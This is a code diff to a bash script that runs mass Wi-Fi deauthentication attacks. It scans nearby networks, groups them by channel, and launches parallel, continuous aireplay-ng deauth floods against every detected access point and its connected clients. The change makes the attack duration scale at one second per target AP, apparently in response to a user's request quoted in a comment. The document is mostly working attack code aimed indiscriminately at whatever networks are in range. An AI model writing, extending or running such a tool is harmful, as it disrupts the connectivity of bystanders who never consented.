@@ -162,7 +162,7 @@ auto_detect_params() {
 
     echo -e "${YELLOW}[*] Network Density Analysis:${NC}"
     echo -e "    - Detected Networks: ${BOLD}$NETWORK_COUNT${NC}"
-    echo -e "    - Attack Delay:      ${BOLD}${ATTACK_DELAY}s${NC} (User Configured)"
+    echo -e "    - Attack Delay:      ${BOLD}Dynamic (1s per AP)${NC}"
     echo -e "    - Deauth Strength:   ${BOLD}Infinite${NC} (Continuous)"
     
     echo -e "${GREEN}[+] Optimization complete.${NC}"
@@ -222,6 +222,7 @@ scan_networks() {
         PRIVACY=$(echo "$PRIVACY" | tr -d ' ')
         
         # Skip invalid lines
+        if [[ "$CHANNEL" == "-1" ]]; then continue; fi
         if [[ "$BSSID" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
             echo "Network,$ESSID,$BSSID,$CHANNEL,$PRIVACY" >> networks.txt
         fi
@@ -303,39 +304,50 @@ attack_loop() {
         for channel in "${!channel_groups[@]}"; do
             targets="${channel_groups[$channel]}"
 
+            # Start simultaneous attacks on this channel
+            IFS='|' read -ra TARGET_LIST <<< "$targets"
+            
+            # Calculate dynamic duration based on target count (1 second per AP)
+            TARGET_COUNT=${#TARGET_LIST[@]}
+            # Minimum 1 second, but scale up with targets if needed.
+            # User request: "delay 1 second for every ap"
+            CURRENT_DURATION=$((TARGET_COUNT * 1))
+            if [ "$CURRENT_DURATION" -lt 1 ]; then CURRENT_DURATION=1; fi
+
             # Dashboard Display
             clear
             print_banner
             echo -e "${RED}${BOLD}                       >>> ATTACK IN PROGRESS <<<                       ${NC}"
             echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
             echo -e "${BOLD}Current Channel:${NC} $channel"
-            echo -e "${BOLD}Attack Duration:${NC} ${ATTACK_DELAY}s per channel"
+            echo -e "${BOLD}Target Count:${NC}    $TARGET_COUNT"
+            echo -e "${BOLD}Attack Duration:${NC} ${CURRENT_DURATION}s"
             echo -e "${BOLD}Target Group:${NC}    $targets"
             echo -e "${YELLOW}------------------------------------------------------------------------${NC}"
-
+            
             iw dev "$INTERFACE" set channel "$channel" &> /dev/null || \
             iwconfig "$INTERFACE" channel "$channel" &> /dev/null
-
+            
             # Double check if channel was set correctly (Crucial for 5GHz)
-            CURRENT_CHAN=$(iw dev "$INTERFACE" info | grep channel | awk '{print $2}')  
+            CURRENT_CHAN=$(iw dev "$INTERFACE" info | grep channel | awk '{print $2}')
             if [[ "$CURRENT_CHAN" != "$channel" ]]; then
                  # Try harder with ifconfig down/up
                  ifconfig "$INTERFACE" down
                  iw dev "$INTERFACE" set channel "$channel" &> /dev/null
                  ifconfig "$INTERFACE" up
             fi
-
+            
             sleep 1 # Allow time for channel switch
 
             # Start simultaneous attacks on this channel
-            IFS='|' read -ra TARGET_LIST <<< "$targets"
+            # TARGET_LIST already populated above
             PIDS=()
-
-            echo -e "\n${CYAN}[*] Launching mass attack on ${#TARGET_LIST[@]} targets...${NC}"
-
+            
+            echo -e "\n${CYAN}[*] Launching mass attack on $TARGET_COUNT targets...${NC}"
+            
             for target_info in "${TARGET_LIST[@]}"; do
                 IFS=',' read -r bssid _ essid <<< "$target_info"
-
+                
                 # 1. Broadcast Deauth (Works on older devices)
                 aireplay-ng --deauth "$DEAUTH_STRENGTH" -a "$bssid" "$INTERFACE" -D --ignore-negative-one &> /dev/null &
                 PIDS+=($!)
@@ -343,17 +355,17 @@ attack_loop() {
                 # 2. Client-Targeted Deauth (Works on newer devices / 5GHz)
                 # Parse clients associated with this BSSID from scan results
                 CLIENTS=$(grep "$bssid" scan_results-01.csv | grep -o -E '([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}' | grep -v "$bssid")
-
+                
                 if [ -n "$CLIENTS" ]; then
                     echo -e "${RED}  -> Targeting AP: $essid ($bssid) + Connected Clients${NC}"
                 else
                     echo -e "${RED}  -> Targeting AP: $essid ($bssid)${NC}"
                 fi
-
+                
                 for client in $CLIENTS; do
                     # Skip broadcast/multicast
-                    if [[ "$client" == "FF:FF:FF:FF:FF:FF" ]]; then continue; fi        
-
+                    if [[ "$client" == "FF:FF:FF:FF:FF:FF" ]]; then continue; fi
+                    
                     # echo "    -> Hammering Client $client on $essid"
                     aireplay-ng --deauth "$DEAUTH_STRENGTH" -a "$bssid" -c "$client" "$INTERFACE" -D --ignore-negative-one &> /dev/null &
                     PIDS+=($!)
@@ -363,8 +375,8 @@ attack_loop() {
             # Wait for the attack duration
             # Show a progress bar or countdown
             echo ""
-            for ((i=1; i<=ATTACK_DELAY; i++)); do
-                 echo -ne "\r${YELLOW}[+] Blasting channel $channel... ($i/$ATTACK_DELAY sec)${NC}"
+            for ((i=1; i<=CURRENT_DURATION; i++)); do
+                 echo -ne "\r${YELLOW}[+] Blasting channel $channel... ($i/$CURRENT_DURATION sec)${NC}"
                  sleep 1
             done
             echo ""
